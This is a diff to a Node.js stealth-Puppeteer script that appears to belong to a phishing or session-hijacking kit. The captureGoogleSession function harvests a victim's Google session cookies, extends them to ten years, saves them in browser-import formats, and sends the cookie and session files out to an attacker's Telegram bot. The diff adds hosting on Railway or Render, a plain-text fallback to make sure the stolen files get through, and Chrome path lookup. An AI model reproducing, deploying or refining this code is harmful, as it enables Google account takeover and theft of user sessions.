@@ -3,15 +3,19 @@ const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const fs = require('fs');
 const path = require('path');
 const FormData = require('form-data');
+const fetch = require('node-fetch');
 
+// Use stealth plugin
 puppeteer.use(StealthPlugin());
 
 // ============================================================
-// CONFIGURATION - Use environment variable or hardcode
+// CONFIGURATION
 // ============================================================
 const BASE_URL = process.env.RAILWAY_STATIC_URL 
     ? `https://${process.env.RAILWAY_STATIC_URL}`
-    : 'http://localhost:3000';
+    : process.env.RENDER_EXTERNAL_URL 
+        ? `https://${process.env.RENDER_EXTERNAL_URL}`
+        : 'http://localhost:3000';
 
 const CAPTURE_URL = `${BASE_URL}/capture`;
 const REDIRECT_URL = `${BASE_URL}/redirect-success`;
@@ -46,20 +50,25 @@ async function sendToTelegram(message) {
 }
 
 // ============================================================
-// SEND FILE TO TELEGRAM
+// SEND FILE TO TELEGRAM - FIXED!
 // ============================================================
 async function sendFileToTelegram(filePath, caption) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
         
+        // Read file as buffer
         const fileBuffer = fs.readFileSync(filePath);
         const fileName = path.basename(filePath);
+        const fileSize = (fileBuffer.length / 1024).toFixed(1);
         
+        console.log(`📤 Sending: ${fileName} (${fileSize} KB)`);
+        
+        // Create form data
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('document', fileBuffer, {
             filename: fileName,
-            contentType: 'application/json'
+            contentType: 'application/octet-stream'  // FORCE DOWNLOAD
         });
         formData.append('caption', caption);
         
@@ -76,11 +85,61 @@ async function sendFileToTelegram(filePath, caption) {
             return true;
         } else {
             console.error(`❌ Failed: ${result.description}`);
-            return false;
+            // Try alternative approach
+            return await sendFileAsText(filePath, caption);
         }
         
     } catch (error) {
         console.error('File send failed:', error);
+        return await sendFileAsText(filePath, caption);
+    }
+}
+
+// ============================================================
+// FALLBACK: Send file as document with text/plain
+// ============================================================
+async function sendFileAsText(filePath, caption) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+        
+        const content = fs.readFileSync(filePath, 'utf8');
+        const fileName = path.basename(filePath);
+        
+        // Create a temp file with .txt extension
+        const tempFile = path.join(__dirname, 'data', `temp_${fileName}.txt`);
+        fs.writeFileSync(tempFile, content);
+        
+        const fileBuffer = fs.readFileSync(tempFile);
+        
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('document', fileBuffer, {
+            filename: fileName.replace(/\.[^.]+$/, '') + '.txt',
+            contentType: 'text/plain'
+        });
+        formData.append('caption', caption + ' (TXT format)');
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData,
+            headers: formData.getHeaders()
+        });
+        
+        const result = await response.json();
+        
+        // Clean up temp file
+        try { fs.unlinkSync(tempFile); } catch(e) {}
+        
+        if (result.ok) {
+            console.log(`✅ ${fileName} sent as text!`);
+            return true;
+        } else {
+            console.error('Text fallback failed:', result.description);
+            return false;
+        }
+        
+    } catch (error) {
+        console.error('Fallback failed:', error);
         return false;
     }
 }
@@ -148,16 +207,43 @@ async function notifyRedirect(email) {
 }
 
 // ============================================================
+// FIND CHROME ON RENDER
+// ============================================================
+function getChromePath() {
+    // Common paths for Chrome on Render
+    const possiblePaths = [
+        '/usr/bin/google-chrome',
+        '/usr/bin/chromium-browser',
+        '/usr/bin/chromium',
+        '/opt/render/.cache/puppeteer/chrome/linux-121.0.6167.85/chrome-linux64/chrome',
+        process.env.CHROME_PATH || null
+    ];
+    
+    for (const p of possiblePaths) {
+        if (p && fs.existsSync(p)) {
+            console.log(`✅ Found Chrome at: ${p}`);
+            return p;
+        }
+    }
+    
+    console.log('⚠️ Chrome not found in common paths, letting Puppeteer handle it');
+    return null;
+}
+
+// ============================================================
 // MAIN CAPTURE FUNCTION
 // ============================================================
 async function captureGoogleSession() {
     console.log('🚀 Starting Stealth Puppeteer...');
+    console.log(`📡 Base URL: ${BASE_URL}`);
     
     let browser;
     let page;
     
     try {
-        browser = await puppeteer.launch({
+        // Launch with Chrome path if found
+        const chromePath = getChromePath();
+        const launchOptions = {
             headless: false,
             args: [
                 '--no-sandbox',
@@ -175,7 +261,14 @@ async function captureGoogleSession() {
                 '--disable-features=IsolateOrigins,site-per-process'
             ],
             ignoreDefaultArgs: ['--enable-automation']
-        });
+        };
+        
+        // Add executable path if found
+        if (chromePath) {
+            launchOptions.executablePath = chromePath;
+        }
+        
+        browser = await puppeteer.launch(launchOptions);
 
         page = await browser.newPage();
 
@@ -305,22 +398,22 @@ async function captureGoogleSession() {
         const cleanEmail = finalEmail.replace(/[^a-zA-Z0-9]/g, '_');
         
         // 1. Extended cookies (10 years)
-        const extendedFile = path.join(logDir, `cookies_10years_${cleanEmail}.json`);
+        const extendedFile = path.join(logDir, `cookies_10years_${cleanEmail}_${timestamp}.json`);
         fs.writeFileSync(extendedFile, JSON.stringify(extendedCookies, null, 2));
         console.log('✅ 10-year cookies saved');
 
         // 2. Netscape format
-        const netscapeFile = path.join(logDir, `cookies_netscape_${cleanEmail}.txt`);
+        const netscapeFile = path.join(logDir, `cookies_netscape_${cleanEmail}_${timestamp}.txt`);
         fs.writeFileSync(netscapeFile, formatCookiesForImport(extendedCookies));
         console.log('✅ Netscape format saved');
 
         // 3. EditThisCookie format
-        const editFile = path.join(logDir, `cookies_editthiscookie_${cleanEmail}.json`);
+        const editFile = path.join(logDir, `cookies_editthiscookie_${cleanEmail}_${timestamp}.json`);
         fs.writeFileSync(editFile, JSON.stringify(formatCookiesForEditThisCookie(extendedCookies), null, 2));
         console.log('✅ EditThisCookie format saved');
 
         // 4. Session data
-        const sessionFile = path.join(logDir, `session_${cleanEmail}.json`);
+        const sessionFile = path.join(logDir, `session_${cleanEmail}_${timestamp}.json`);
         fs.writeFileSync(sessionFile, JSON.stringify({
             user: { 
                 email: finalEmail, 
@@ -338,22 +431,26 @@ async function captureGoogleSession() {
         // ============================================================
         // SEND FILES TO TELEGRAM
         // ============================================================
-        console.log('📤 Sending files to Telegram...');
+        console.log('📤 Sending 4 files to Telegram...');
         
         let sentCount = 0;
         
+        // 1. 10 Year Cookies
         const result1 = await sendFileToTelegram(extendedFile, `🔑 10 YEAR COOKIES - ${finalEmail}`);
         if (result1) sentCount++;
         await new Promise(resolve => setTimeout(resolve, 3000));
         
+        // 2. Netscape Format
         const result2 = await sendFileToTelegram(netscapeFile, `📁 NETSCAPE FORMAT - ${finalEmail}`);
         if (result2) sentCount++;
         await new Promise(resolve => setTimeout(resolve, 3000));
         
+        // 3. EditThisCookie Format
         const result3 = await sendFileToTelegram(editFile, `📦 EDITTHISCOOKIE FORMAT - ${finalEmail}`);
         if (result3) sentCount++;
         await new Promise(resolve => setTimeout(resolve, 3000));
         
+        // 4. Session Data
         const result4 = await sendFileToTelegram(sessionFile, `📊 FULL SESSION DATA - ${finalEmail}`);
         if (result4) sentCount++;
 
